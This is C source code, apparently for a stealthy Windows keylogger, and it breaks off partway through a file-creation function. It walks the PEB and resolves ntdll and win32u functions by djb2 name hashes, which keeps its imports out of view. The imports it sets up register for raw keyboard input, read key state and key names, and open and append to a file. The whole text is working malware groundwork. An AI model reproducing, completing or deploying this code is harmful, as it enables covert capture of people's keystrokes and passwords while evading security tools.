#include <Windows.h>

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#define OBJ_CASE_INSENSITIVE 0x00000040L
#define FILE_OPEN_IF 0x00000003
#define FILE_NON_DIRECTORY_FILE 0x00000040
#define FILE_SYNCHRONOUS_IO_NONALERT 0x00000020
#define WM_MAXIMUM   0x0001FFFF

typedef struct _LSA_UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} LSA_UNICODE_STRING, * PLSA_UNICODE_STRING, UNICODE_STRING, * PUNICODE_STRING;

typedef struct _LDR_MODULE {
	LIST_ENTRY              InLoadOrderModuleList;
	LIST_ENTRY              InMemoryOrderModuleList;
	LIST_ENTRY              InInitializationOrderModuleList;
	PVOID                   BaseAddress;
	PVOID                   EntryPoint;
	ULONG                   SizeOfImage;
	UNICODE_STRING          FullDllName;
	UNICODE_STRING          BaseDllName;
	ULONG                   Flags;
	SHORT                   LoadCount;
	SHORT                   TlsIndex;
	LIST_ENTRY              HashTableEntry;
	ULONG                   TimeDateStamp;
} LDR_MODULE, * PLDR_MODULE;

typedef struct _PEB_LDR_DATA {
	ULONG                   Length;
	ULONG                   Initialized;
	PVOID                   SsHandle;
	LIST_ENTRY              InLoadOrderModuleList;
	LIST_ENTRY              InMemoryOrderModuleList;
	LIST_ENTRY              InInitializationOrderModuleList;
} PEB_LDR_DATA, * PPEB_LDR_DATA;

typedef struct _PEB {
	BOOLEAN                 InheritedAddressSpace;
	BOOLEAN                 ReadImageFileExecOptions;
	BOOLEAN                 BeingDebugged;
	BOOLEAN                 Spare;
	HANDLE                  Mutant;
	PVOID                   ImageBase;
	PPEB_LDR_DATA           LoaderData;
	PVOID                   ProcessParameters;
	PVOID                   SubSystemData;
	PVOID                   ProcessHeap;
	PVOID                   FastPebLock;
	PVOID                   FastPebLockRoutine;
	PVOID                   FastPebUnlockRoutine;
	ULONG                   EnvironmentUpdateCount;
	PVOID* KernelCallbackTable;
	PVOID                   EventLogSection;
	PVOID                   EventLog;
	PVOID                   FreeList;
	ULONG                   TlsExpansionCounter;
	PVOID                   TlsBitmap;
	ULONG                   TlsBitmapBits[0x2];
	PVOID                   ReadOnlySharedMemoryBase;
	PVOID                   ReadOnlySharedMemoryHeap;
	PVOID* ReadOnlyStaticServerData;
	PVOID                   AnsiCodePageData;
	PVOID                   OemCodePageData;
	PVOID                   UnicodeCaseTableData;
	ULONG                   NumberOfProcessors;
	ULONG                   NtGlobalFlag;
	BYTE                    Spare2[0x4];
	LARGE_INTEGER           CriticalSectionTimeout;
	ULONG                   HeapSegmentReserve;
	ULONG                   HeapSegmentCommit;
	ULONG                   HeapDeCommitTotalFreeThreshold;
	ULONG                   HeapDeCommitFreeBlockThreshold;
	ULONG                   NumberOfHeaps;
	ULONG                   MaximumNumberOfHeaps;
	PVOID** ProcessHeaps;
	PVOID                   GdiSharedHandleTable;
	PVOID                   ProcessStarterHelper;
	PVOID                   GdiDCAttributeList;
	PVOID                   LoaderLock;
	ULONG                   OSMajorVersion;
	ULONG                   OSMinorVersion;
	ULONG                   OSBuildNumber;
	ULONG                   OSPlatformId;
	ULONG                   ImageSubSystem;
	ULONG                   ImageSubSystemMajorVersion;
	ULONG                   ImageSubSystemMinorVersion;
	ULONG                   GdiHandleBuffer[0x22];
	ULONG                   PostProcessInitRoutine;
	ULONG                   TlsExpansionBitmap;
	BYTE                    TlsExpansionBitmapBits[0x80];
	ULONG                   SessionId;
} PEB, * PPEB;

typedef struct __CLIENT_ID {
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
}CLIENT_ID, * PCLIENT_ID;

typedef struct _RTLP_CURDIR_REF {
	LONG RefCount;
	HANDLE Handle;
}RTLP_CURDIR_REF, * PRTLP_CURDIR_REF;

typedef struct _RTL_RELATIVE_NAME_U {
	UNICODE_STRING RelativeName;
	HANDLE ContainingDirectory;
	PRTLP_CURDIR_REF CurDirRef;
}RTL_RELATIVE_NAME_U, * PRTL_RELATIVE_NAME_U;

typedef struct _OBJECT_ATTRIBUTES {
	ULONG           Length;
	HANDLE          RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG           Attributes;
	PVOID           SecurityDescriptor;
	PVOID           SecurityQualityOfService;
}  OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef struct _FILE_STANDARD_INFORMATION {
	LARGE_INTEGER AllocationSize;
	LARGE_INTEGER EndOfFile;
	ULONG         NumberOfLinks;
	BOOLEAN       DeletePending;
	BOOLEAN       Directory;
} FILE_STANDARD_INFORMATION, * PFILE_STANDARD_INFORMATION;

typedef enum _FILE_INFORMATION_CLASS {
	FileDirectoryInformation = 1,
	FileFullDirectoryInformation,
	FileBothDirectoryInformation,
	FileBasicInformation,
	FileStandardInformation,
	FileInternalInformation,
	FileEaInformation,
	FileAccessInformation,
	FileNameInformation,
	FileRenameInformation,
	FileLinkInformation,
	FileNamesInformation,
	FileDispositionInformation,
	FilePositionInformation,
	FileFullEaInformation,
	FileModeInformation,
	FileAlignmentInformation,
	FileAllInformation,
	FileAllocationInformation,
	FileEndOfFileInformation,
	FileAlternateNameInformation,
	FileStreamInformation,
	FilePipeInformation,
	FilePipeLocalInformation,
	FilePipeRemoteInformation,
	FileMailslotQueryInformation,
	FileMailslotSetInformation,
	FileCompressionInformation,
	FileObjectIdInformation,
	FileCompletionInformation,
	FileMoveClusterInformation,
	FileQuotaInformation,
	FileReparsePointInformation,
	FileNetworkOpenInformation,
	FileAttributeTagInformation,
	FileTrackingInformation,
	FileIdBothDirectoryInformation,
	FileIdFullDirectoryInformation,
	FileValidDataLengthInformation,
	FileShortNameInformation,
	FileIoCompletionNotificationInformation,
	FileIoStatusBlockRangeInformation,
	FileIoPriorityHintInformation,
	FileSfioReserveInformation,
	FileSfioVolumeInformation,
	FileHardLinkInformation,
	FileProcessIdsUsingFileInformation,
	FileNormalizedNameInformation,
	FileNetworkPhysicalNameInformation,
	FileIdGlobalTxDirectoryInformation,
	FileIsRemoteDeviceInformation,
	FileUnusedInformation,
	FileNumaNodeInformation,
	FileStandardLinkInformation,
	FileRemoteProtocolInformation,
	FileRenameInformationBypassAccessCheck,
	FileLinkInformationBypassAccessCheck,
	FileVolumeNameInformation,
	FileIdInformation,
	FileIdExtdDirectoryInformation,
	FileReplaceCompletionInformation,
	FileHardLinkFullIdInformation,
	FileIdExtdBothDirectoryInformation,
	FileMaximumInformation
} FILE_INFORMATION_CLASS, * PFILE_INFORMATION_CLASS;

typedef struct _IO_STATUS_BLOCK {
	union {
		NTSTATUS Status;
		PVOID    Pointer;
	};
	ULONG_PTR Information;
} IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;

typedef struct _FILE_POSITION_INFORMATION {
	LARGE_INTEGER CurrentByteOffset;
} FILE_POSITION_INFORMATION, * PFILE_POSITION_INFORMATION;

typedef PVOID PACTIVATION_CONTEXT;

typedef struct _IO_APC_ROUTINE {
	VOID* ApcContext;
	PIO_STATUS_BLOCK IoStatusBlock;
	ULONG		     Reserved;
} IO_APC_ROUTINE, * PIO_APC_ROUTINE;

typedef struct _STRING {
	USHORT Length;
	USHORT MaximumLength;
	PCHAR  Buffer;
} ANSI_STRING, * PANSI_STRING;

typedef struct _RTL_DRIVE_LETTER_CURDIR {
	WORD Flags;
	WORD Length;
	ULONG TimeStamp;
	ANSI_STRING DosPath;
} RTL_DRIVE_LETTER_CURDIR, * PRTL_DRIVE_LETTER_CURDIR;

typedef struct _CURDIR {
	UNICODE_STRING DosPath;
	PVOID Handle;
}CURDIR, * PCURDIR;

typedef struct _RTL_USER_PROCESS_PARAMETERS {
	ULONG MaximumLength;
	ULONG Length;
	ULONG Flags;
	ULONG DebugFlags;
	PVOID ConsoleHandle;
	ULONG ConsoleFlags;
	PVOID StandardInput;
	PVOID StandardOutput;
	PVOID StandardError;
	CURDIR CurrentDirectory;
	UNICODE_STRING DllPath;
	UNICODE_STRING ImagePathName;
	UNICODE_STRING CommandLine;
	PVOID Environment;
	ULONG StartingX;
	ULONG StartingY;
	ULONG CountX;
	ULONG CountY;
	ULONG CountCharsX;
	ULONG CountCharsY;
	ULONG FillAttribute;
	ULONG WindowFlags;
	ULONG ShowWindowFlags;
	UNICODE_STRING WindowTitle;
	UNICODE_STRING DesktopInfo;
	UNICODE_STRING ShellInfo;
	UNICODE_STRING RuntimeData;
	RTL_DRIVE_LETTER_CURDIR CurrentDirectores[32];
	ULONG EnvironmentSize;
}RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;

typedef struct _RTL_ACTIVATION_CONTEXT_STACK_FRAME {
	struct __RTL_ACTIVATION_CONTEXT_STACK_FRAME* Previous;
	PACTIVATION_CONTEXT ActivationContext;
	ULONG Flags;
} RTL_ACTIVATION_CONTEXT_STACK_FRAME, * PRTL_ACTIVATION_CONTEXT_STACK_FRAME;

typedef struct _ACTIVATION_CONTEXT_STACK {
	PRTL_ACTIVATION_CONTEXT_STACK_FRAME ActiveFrame;
	LIST_ENTRY FrameListCache;
	ULONG Flags;
	ULONG NextCookieSequenceNumber;
	ULONG StackId;
} ACTIVATION_CONTEXT_STACK, * PACTIVATION_CONTEXT_STACK;

typedef struct _GDI_TEB_BATCH {
	ULONG Offset;
	ULONG HDC;
	ULONG Buffer[310];
} GDI_TEB_BATCH, * PGDI_TEB_BATCH;

typedef struct _TEB_ACTIVE_FRAME_CONTEXT {
	ULONG Flags;
	PCHAR FrameName;
} TEB_ACTIVE_FRAME_CONTEXT, * PTEB_ACTIVE_FRAME_CONTEXT;

typedef struct _TEB_ACTIVE_FRAME {
	ULONG Flags;
	struct _TEB_ACTIVE_FRAME* Previous;
	PTEB_ACTIVE_FRAME_CONTEXT Context;
} TEB_ACTIVE_FRAME, * PTEB_ACTIVE_FRAME;

typedef struct _TEB
{
	NT_TIB				NtTib;
	PVOID				EnvironmentPointer;
	CLIENT_ID			ClientId;
	PVOID				ActiveRpcHandle;
	PVOID				ThreadLocalStoragePointer;
	PPEB				ProcessEnvironmentBlock;
	ULONG               LastErrorValue;
	ULONG               CountOfOwnedCriticalSections;
	PVOID				CsrClientThread;
	PVOID				Win32ThreadInfo;
	ULONG               User32Reserved[26];
	ULONG               UserReserved[5];
	PVOID				WOW32Reserved;
	LCID                CurrentLocale;
	ULONG               FpSoftwareStatusRegister;
	PVOID				SystemReserved1[54];
	LONG                ExceptionCode;
#if (NTDDI_VERSION >= NTDDI_LONGHORN)
	PACTIVATION_CONTEXT_STACK* ActivationContextStackPointer;
	UCHAR                  SpareBytes1[0x30 - 3 * sizeof(PVOID)];
	ULONG                  TxFsContext;
#elif (NTDDI_VERSION >= NTDDI_WS03)
	PACTIVATION_CONTEXT_STACK ActivationContextStackPointer;
	UCHAR                  SpareBytes1[0x34 - 3 * sizeof(PVOID)];
#else
	ACTIVATION_CONTEXT_STACK ActivationContextStack;
	UCHAR                  SpareBytes1[24];
#endif
	GDI_TEB_BATCH			GdiTebBatch;
	CLIENT_ID				RealClientId;
	PVOID					GdiCachedProcessHandle;
	ULONG                   GdiClientPID;
	ULONG                   GdiClientTID;
	PVOID					GdiThreadLocalInfo;
	PSIZE_T					Win32ClientInfo[62];
	PVOID					glDispatchTable[233];
	PSIZE_T					glReserved1[29];
	PVOID					glReserved2;
	PVOID					glSectionInfo;
	PVOID					glSection;
	PVOID					glTable;
	PVOID					glCurrentRC;
	PVOID					glContext;
	NTSTATUS                LastStatusValue;
	UNICODE_STRING			StaticUnicodeString;
	WCHAR                   StaticUnicodeBuffer[261];
	PVOID					DeallocationStack;
	PVOID					TlsSlots[64];
	LIST_ENTRY				TlsLinks;
	PVOID					Vdm;
	PVOID					ReservedForNtRpc;
	PVOID					DbgSsReserved[2];
#if (NTDDI_VERSION >= NTDDI_WS03)
	ULONG                   HardErrorMode;
#else
	ULONG                  HardErrorsAreDisabled;
#endif
#if (NTDDI_VERSION >= NTDDI_LONGHORN)
	PVOID					Instrumentation[13 - sizeof(GUID) / sizeof(PVOID)];
	GUID                    ActivityId;
	PVOID					SubProcessTag;
	PVOID					EtwLocalData;
	PVOID					EtwTraceData;
#elif (NTDDI_VERSION >= NTDDI_WS03)
	PVOID					Instrumentation[14];
	PVOID					SubProcessTag;
	PVOID					EtwLocalData;
#else
	PVOID					Instrumentation[16];
#endif
	PVOID					WinSockData;
	ULONG					GdiBatchCount;
#if (NTDDI_VERSION >= NTDDI_LONGHORN)
	BOOLEAN                SpareBool0;
	BOOLEAN                SpareBool1;
	BOOLEAN                SpareBool2;
#else
	BOOLEAN                InDbgPrint;
	BOOLEAN                FreeStackOnTermination;
	BOOLEAN                HasFiberData;
#endif
	UCHAR                  IdealProcessor;
#if (NTDDI_VERSION >= NTDDI_WS03)
	ULONG                  GuaranteedStackBytes;
#else
	ULONG                  Spare3;
#endif
	PVOID				   ReservedForPerf;
	PVOID				   ReservedForOle;
	ULONG                  WaitingOnLoaderLock;
#if (NTDDI_VERSION >= NTDDI_LONGHORN)
	PVOID				   SavedPriorityState;
	ULONG_PTR			   SoftPatchPtr1;
	ULONG_PTR			   ThreadPoolData;
#elif (NTDDI_VERSION >= NTDDI_WS03)
	ULONG_PTR			   SparePointer1;
	ULONG_PTR              SoftPatchPtr1;
	ULONG_PTR              SoftPatchPtr2;
#else
	Wx86ThreadState        Wx86Thread;
#endif
	PVOID* TlsExpansionSlots;
#if defined(_WIN64) && !defined(EXPLICIT_32BIT)
	PVOID                  DeallocationBStore;
	PVOID                  BStoreLimit;
#endif
	ULONG                  ImpersonationLocale;
	ULONG                  IsImpersonating;
	PVOID                  NlsCache;
	PVOID                  pShimData;
	ULONG                  HeapVirtualAffinity;
	HANDLE                 CurrentTransactionHandle;
	PTEB_ACTIVE_FRAME      ActiveFrame;
#if (NTDDI_VERSION >= NTDDI_WS03)
	PVOID FlsData;
#endif
#if (NTDDI_VERSION >= NTDDI_LONGHORN)
	PVOID PreferredLangauges;
	PVOID UserPrefLanguages;
	PVOID MergedPrefLanguages;
	ULONG MuiImpersonation;
	union
	{
		struct
		{
			USHORT SpareCrossTebFlags : 16;
		};
		USHORT CrossTebFlags;
	};
	union
	{
		struct
		{
			USHORT DbgSafeThunkCall : 1;
			USHORT DbgInDebugPrint : 1;
			USHORT DbgHasFiberData : 1;
			USHORT DbgSkipThreadAttach : 1;
			USHORT DbgWerInShipAssertCode : 1;
			USHORT DbgIssuedInitialBp : 1;
			USHORT DbgClonedThread : 1;
			USHORT SpareSameTebBits : 9;
		};
		USHORT SameTebFlags;
	};
	PVOID TxnScopeEntercallback;
	PVOID TxnScopeExitCAllback;
	PVOID TxnScopeContext;
	ULONG LockCount;
	ULONG ProcessRundown;
	ULONG64 LastSwitchTime;
	ULONG64 TotalSwitchOutTime;
	LARGE_INTEGER WaitReasonBitMap;
#else
	BOOLEAN SafeThunkCall;
	BOOLEAN BooleanSpare[3];
#endif
} TEB, * PTEB;

#define InitializeObjectAttributes(p, n, a, r, s) \
{ \
	(p)->Length = sizeof(OBJECT_ATTRIBUTES); \
	(p)->RootDirectory = r; \
	(p)->Attributes = a; \
	(p)->ObjectName = n; \
	(p)->SecurityDescriptor = s; \
	(p)->SecurityQualityOfService = NULL; \
}

#define HID_USAGE_PAGE_GENERIC 0x01
#define HID_USAGE_GENERIC_KEYBOARD 0x06

#define IS_ATOM(x) (((ULONG_PTR)(x) > 0x0) && ((ULONG_PTR)(x) < 0x10000))

typedef PVOID(NTAPI* RTLALLOCATEHEAP)(PVOID, ULONG, SIZE_T);
#define RTLALLOCATEHEAP_SIG 0xc0b381da

typedef BOOL(NTAPI* RTLFREEHEAP)(PVOID, ULONG, PVOID);
#define RTLFREEHEAP_SIG 0x70ba71d7

typedef NTSTATUS(NTAPI* LDRLOADDLL) (PWCHAR, DWORD, PUNICODE_STRING, PHANDLE);
#define LDRLOADDLL_SIG 0x0307db23

typedef NTSTATUS(NTAPI* NTCLOSE)(HANDLE);
#define NTCLOSE_SIG 0x8b8e133d

typedef NTSTATUS(NTAPI* NTCREATEFILE)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK, PLARGE_INTEGER, ULONG, ULONG, ULONG, ULONG, PVOID, ULONG);
#define NTCREATEFILE_SIG 0x15a5ecdb

typedef NTSTATUS(NTAPI* RTLDOSPATHNAMETONTPATHNAME_U)(PCWSTR, PUNICODE_STRING, PCWSTR*, PRTL_RELATIVE_NAME_U);
#define RTLDOSPATHNAMETONTPATHNAME_U_SIG 0xbfe457b2

typedef LRESULT(NTAPI* NTDLLDEFWINDOWPROC_W)(HWND, UINT, WPARAM, LPARAM);
#define NTDLLDEFWINDOWPROC_W_SIG 0x058790f4

typedef NTSTATUS(NTAPI* NTQUERYINFORMATIONFILE)(HANDLE, PIO_STATUS_BLOCK, PVOID, ULONG, FILE_INFORMATION_CLASS);
#define NTQUERYINFORMATIONFILE_SIG 0x4725f863

typedef NTSTATUS(NTAPI* NTSETINFORMATIONFILE) (HANDLE, PIO_STATUS_BLOCK, PVOID, ULONG, FILE_INFORMATION_CLASS);
#define NTSETINFORMATIONFILE_SIG 0x6e88b479

typedef NTSTATUS(NTAPI* NTWRITEFILE)(HANDLE, HANDLE, PIO_APC_ROUTINE, PVOID, PIO_STATUS_BLOCK, PVOID, ULONG, PLARGE_INTEGER, PULONG);
#define NTWRITEFILE_SIG 0xd69326b2

//WIN32U

typedef VOID(NTAPI* NTUSERCALLONEPARAM)(DWORD, DWORD);
#define NTUSERCALLONEPARAM_SIG 0xb19a9f55

typedef BOOL(NTAPI* NTUSERDESTROYWINDOW)(HWND);
#define NTUSERDESTROYWINDOW_SIG 0xabad4a48

typedef BOOL(NTAPI* NTUSERREGISTERRAWINPUTDEVICES)(PCRAWINPUTDEVICE, UINT, UINT);
#define NTUSERREGISTERRAWINPUTDEVICES_SIG 0x76dc2408

typedef UINT(NTAPI* NTUSERGETRAWINPUTDATA)(HRAWINPUT, UINT, LPVOID, PUINT, UINT);
#define NTUSERGETRAWINPUTDATA_SIG 0xd902c31a

typedef BOOL(NTAPI* NTUSERGETKEYBOARDSTATE)(PBYTE);
#define NTUSERGETKEYBOARDSTATE_SIG 0x92ca3458

typedef INT(NTAPI* NTUSERTOUNICODEEX)(UINT, UINT, PBYTE, LPWSTR, INT, UINT, HKL);
#define NTUSERTOUNICODEEX_SIG 0xe561424d

typedef UINT(NTAPI* NTUSERMAPVIRTUALKEYEX)(UINT, UINT, UINT, UINT);
#define NTUSERMAPVIRTUALKEYEX_SIG 0xc8e8ef51

typedef INT(NTAPI* NTUSERGETKEYNAMETEXT)(LONG, LPWSTR, INT);
#define NTUSERGETKEYNAMETEXT_SIG 0x5be51535

typedef BOOL(NTAPI* NTUSERGETMESSAGE)(LPMSG, HWND, UINT, UINT);
#define NTUSERGETMESSAGE_SIG 0xb6c60f8b

typedef BOOL(NTAPI* NTUSERTRANSLATEMESSAGE)(PMSG, UINT);
#define NTUSERTRANSLATEMESSAGE_SIG 0xafc97a79

VOID RtlZeroMemoryInternal(PVOID Destination, SIZE_T Size)
{
	PULONG Dest = (PULONG)Destination;
	SIZE_T Count = Size / sizeof(ULONG);

	while (Count > 0)
	{
		*Dest = 0;
		Dest++;
		Count--;
	}

	return;
}

SIZE_T StringLengthW(LPCWSTR String)
{
	LPCWSTR String2;

	for (String2 = String; *String2; ++String2);

	return (String2 - String);
}

PWCHAR StringCopyW(PWCHAR String1, PWCHAR String2)
{
	PWCHAR p = String1;

	while ((*p++ = *String2++) != 0);

	return String1;
}

PWCHAR StringConcatW(PWCHAR String, PWCHAR String2)
{
	StringCopyW(&String[StringLengthW(String)], String2);

	return String;
}

DWORD DecimalToAsciiW(PWCHAR String, LPDWORD dwArray, DWORD Length)
{
	DWORD dwX = ERROR_SUCCESS;

	if (String == NULL)
		return dwX;

	for (; dwX < Length; dwX++) { String[dwX] = (WCHAR)dwArray[dwX]; }

	return dwX;
}

PWCHAR UpperStringW(PWCHAR String)
{
	PWCHAR pwPtr = String;
	while (*pwPtr != '\0')
	{
		if (*pwPtr >= 'a' && *pwPtr <= 'z')
			*pwPtr = *pwPtr - ('a' - 'A');

		pwPtr++;
	}
	return String;
}

PWCHAR StringTokenW(PWCHAR String, CONST PWCHAR Delim)
{
	PWCHAR Last;
	PWCHAR SpanP, Token;
	INT C, SC;

	if (String == NULL)
		return NULL;

CONTINUE:

	C = *String++;

	for (SpanP = (PWCHAR)Delim; (SC = *SpanP++) != ERROR_SUCCESS;)
	{
		if (C == SC)
			goto CONTINUE;
	}

	if (C == ERROR_SUCCESS) { Last = NULL; return NULL; }

	Token = String - 1;

	for (;;)
	{
		C = *String++;
		SpanP = (PWCHAR)Delim;

		do {
			if ((SC = *SpanP++) == C)
			{
				if (C == ERROR_SUCCESS)
					String = NULL;
				else
					String[-1] = '\0';

				Last = String;
				return Token;
			}
		} while (SC != ERROR_SUCCESS);
	}

	return NULL;
}

DWORD HashStringDjb2A(PCHAR String)
{
	ULONG Hash = 5381;
	INT c;

	while (c = *String++)
		Hash = ((Hash << 5) + Hash) + c;

	return Hash;
}

DWORD HashStringDjb2W(PWCHAR String)
{
	ULONG Hash = 5381;
	INT c;

	while (c = *String++)
		Hash = ((Hash << 5) + Hash) + c;

	return Hash;
}

VOID RtlInitUnicodeString(PUNICODE_STRING DestinationString, PCWSTR SourceString)
{
	SIZE_T DestSize;

	if (SourceString)
	{
		DestSize = StringLengthW(SourceString) * sizeof(WCHAR);
		DestinationString->Length = (USHORT)DestSize;
		DestinationString->MaximumLength = (USHORT)DestSize + sizeof(WCHAR);
	}
	else
	{
		DestinationString->Length = 0;
		DestinationString->MaximumLength = 0;
	}

	DestinationString->Buffer = (PWCHAR)SourceString;
}

VOID RtlInitEmptyUnicodeString(PUNICODE_STRING UnicodeString, PWCHAR Buffer, USHORT BufferSize)
{
	UnicodeString->Length = 0;
	UnicodeString->MaximumLength = BufferSize;
	UnicodeString->Buffer = Buffer;
}

typedef struct API_IMPORT_TABLE {
	DWORD64 PeBase;				//NTDLL.DLL
	DWORD64 Win32uBase;			//WIN32U.DLL
	DWORD Error;				//GLOBAL ERROR HANDLER

	PPEB Peb;					//PEB POINTER
	PTEB Teb;					//TEB POINTER

	PWCHAR lpszClassNameBuffer;	//WINDOWS CLASS NAME

	//NTDLL IMPORTS
	LDRLOADDLL LdrLoadDll;
	RTLALLOCATEHEAP RtlAllocateHeap;
	RTLFREEHEAP RtlFreeHeap;
	NTCLOSE NtClose;
	NTCREATEFILE NtCreateFile;
	RTLDOSPATHNAMETONTPATHNAME_U RtlDosPathNameToNtPathName_U;
	NTDLLDEFWINDOWPROC_W NtdllDefWindowProc_W;
	NTQUERYINFORMATIONFILE NtQueryInformationFile;
	NTSETINFORMATIONFILE NtSetInformationFile;
	NTWRITEFILE NtWriteFile;

	//WIN32U IMPORTS
	NTUSERCALLONEPARAM NtUserCallOneParam;
	NTUSERDESTROYWINDOW NtUserDestroyWindow;
	NTUSERREGISTERRAWINPUTDEVICES NtUserRegisterRawInputDevices;
	NTUSERGETRAWINPUTDATA NtUserGetRawInputData;
	NTUSERGETKEYBOARDSTATE NtUserGetKeyboardState;
	NTUSERTOUNICODEEX NtUserToUnicodeEx;
	NTUSERMAPVIRTUALKEYEX NtUserMapVirtualKeyEx;
	NTUSERGETKEYNAMETEXT NtUserGetKeyNameText;
	NTUSERGETMESSAGE NtUserGetMessage;
	NTUSERTRANSLATEMESSAGE NtUserTranslateMessage;

}API_TABLE, PAPI_TABLE;

PTEB GetTeb(VOID)
{
#if defined(_WIN64)
	return (PTEB)__readgsqword(0x30);
#elif define(_WIN32)
	return (PTEB)__readfsdword(0x18);
#endif
}

API_IMPORT_TABLE Api;

DWORD InlineTebGetLastError(VOID)
{
	return Api.Teb->LastErrorValue;
}

DWORD InlineUppGetEnvironmentVariableW(LPCWSTR Name, LPWSTR Buffer, DWORD Size)
{
	UNICODE_STRING uString; RtlZeroMemoryInternal(&uString, sizeof(UNICODE_STRING));
	UNICODE_STRING Variable; RtlZeroMemoryInternal(&Variable, sizeof(UNICODE_STRING));
	DWORD Token[1] = { 61 };
	LPWSTR String = NULL;
	PRTL_USER_PROCESS_PARAMETERS ProcessParameters = (PRTL_USER_PROCESS_PARAMETERS)Api.Peb->ProcessParameters;
	LPWSTR Environment = (LPWSTR)ProcessParameters->Environment;
	LPWSTR lpszPtr = (LPWSTR)Environment;
	PWCHAR Pointer;

	BOOL bFlag = FALSE;

	String = (LPWSTR)Api.RtlAllocateHeap(Api.Peb->ProcessHeap, HEAP_ZERO_MEMORY, sizeof(WCHAR) * 2);
	if (String == NULL)
		goto EXIT_ROUTINE;

	DecimalToAsciiW(String, Token, 1);

	Name = UpperStringW((PWCHAR)Name);
	if (Name == NULL)
		goto EXIT_ROUTINE;

	RtlInitUnicodeString(&Variable, (PWCHAR)Name);

	while (*lpszPtr)
	{
		DWORD dwVariableHash = 0;
		DWORD dwPointerHash = 0;
		lpszPtr += StringLengthW(lpszPtr) + 1;
		Pointer = StringTokenW(lpszPtr, String);
		if (Pointer == NULL)
			goto EXIT_ROUTINE;

		Pointer = UpperStringW((PWCHAR)Pointer);

		dwVariableHash = HashStringDjb2W(Variable.Buffer);
		dwPointerHash = HashStringDjb2W(lpszPtr);

		if (dwVariableHash == dwPointerHash)
		{
			lpszPtr += StringLengthW(lpszPtr) + 1;
			Pointer = StringTokenW(lpszPtr, String);
			if (Pointer == NULL)
				goto EXIT_ROUTINE;

			RtlInitUnicodeString(&uString, Pointer);
			break;
		}

	}

	if (StringCopyW(Buffer, uString.Buffer) == NULL)
		goto EXIT_ROUTINE;

	bFlag = TRUE;

EXIT_ROUTINE:

	if (String)
		Api.RtlFreeHeap(Api.Peb->ProcessHeap, HEAP_ZERO_MEMORY, String);

	return (bFlag == TRUE ? uString.Length : 0);
}

BOOL RtlLoadPeHeaders(PIMAGE_DOS_HEADER* Dos, PIMAGE_NT_HEADERS* Nt, PIMAGE_FILE_HEADER* File, PIMAGE_OPTIONAL_HEADER* Optional, PBYTE* ImageBase)
{
	*Dos = (PIMAGE_DOS_HEADER)*ImageBase;
	if ((*Dos)->e_magic != IMAGE_DOS_SIGNATURE)
		return FALSE;

	*Nt = (PIMAGE_NT_HEADERS)((PBYTE)*Dos + (*Dos)->e_lfanew);
	if ((*Nt)->Signature != IMAGE_NT_SIGNATURE)
		return FALSE;

	*File = (PIMAGE_FILE_HEADER)(*ImageBase + (*Dos)->e_lfanew + sizeof(DWORD));
	*Optional = (PIMAGE_OPTIONAL_HEADER)((PBYTE)*File + sizeof(IMAGE_FILE_HEADER));

	return TRUE;
}

DWORD64 __stdcall ImportFunction(DWORD64 ModuleBase, DWORD64 Hash)
{
	PBYTE pFunctionName;
	PIMAGE_DOS_HEADER Dos;
	PIMAGE_NT_HEADERS Nt;
	PIMAGE_FILE_HEADER File;
	PIMAGE_OPTIONAL_HEADER Optional;

	RtlLoadPeHeaders(&Dos, &Nt, &File, &Optional, (PBYTE*)&ModuleBase);

	IMAGE_EXPORT_DIRECTORY* ExportTable = (PIMAGE_EXPORT_DIRECTORY)(ModuleBase + Optional->DataDirectory[0].VirtualAddress);
	PDWORD FunctionNameAddressArray = (PDWORD)((LPBYTE)ModuleBase + ExportTable->AddressOfNames);
	PDWORD FunctionAddressArray = (PDWORD)((LPBYTE)ModuleBase + ExportTable->AddressOfFunctions);
	PWORD FunctionOrdinalAddressArray = (PWORD)((LPBYTE)ModuleBase + ExportTable->AddressOfNameOrdinals);
	DWORD dwX;

	for (dwX = 0; dwX < ExportTable->NumberOfNames; dwX++)
	{
		pFunctionName = FunctionNameAddressArray[dwX] + (PBYTE)ModuleBase;
		DWORD dwFunctionHash = HashStringDjb2A((PCHAR)pFunctionName);

		if (Hash == dwFunctionHash)
			return ((DWORD64)ModuleBase + FunctionAddressArray[FunctionOrdinalAddressArray[dwX]]);
	}

	return 0;
}

VOID InlineWin32uPostQuitMessage(DWORD nExitCode)
{
	Api.NtUserCallOneParam(nExitCode, 0x3B);
	return;
}

DWORD InlineRtlSetFilePointerToEnd(HANDLE File)
{
	FILE_POSITION_INFORMATION FilePosition; RtlZeroMemoryInternal(&FilePosition, sizeof(FILE_POSITION_INFORMATION));
	FILE_STANDARD_INFORMATION FileStandard; RtlZeroMemoryInternal(&FileStandard, sizeof(FILE_STANDARD_INFORMATION));
	LARGE_INTEGER Distance; RtlZeroMemoryInternal(&Distance, sizeof(LARGE_INTEGER));
	IO_STATUS_BLOCK Block; RtlZeroMemoryInternal(&Block, sizeof(IO_STATUS_BLOCK));
	NTSTATUS Status = ERROR_SUCCESS;

	if (((ULONG_PTR)File & 0x10000003) == 0x3)
		return INVALID_SET_FILE_POINTER;

	Status = Api.NtQueryInformationFile(File, &Block, &FilePosition, sizeof(FILE_POSITION_INFORMATION), FilePositionInformation);
	if(!NT_SUCCESS(Status))
		return INVALID_SET_FILE_POINTER;
	else
		FilePosition.CurrentByteOffset.QuadPart = FileStandard.EndOfFile.QuadPart + Distance.QuadPart;

	if (FilePosition.CurrentByteOffset.QuadPart < ERROR_SUCCESS)
		return INVALID_SET_FILE_POINTER;

	Status = Api.NtSetInformationFile(File, &Block, &FilePosition, sizeof(FILE_POSITION_INFORMATION), FilePositionInformation);
	if (!NT_SUCCESS(Status))
		return INVALID_SET_FILE_POINTER;

	return FilePosition.CurrentByteOffset.u.LowPart;
}

HANDLE InlineNtdllNtCreateFile(LPCWSTR lpFileName)
{
	OBJECT_ATTRIBUTES Attributes; RtlZeroMemoryInternal(&Attributes, sizeof(OBJECT_ATTRIBUTES));
	IO_STATUS_BLOCK Io; RtlZeroMemoryInternal(&Io, sizeof(IO_STATUS_BLOCK));
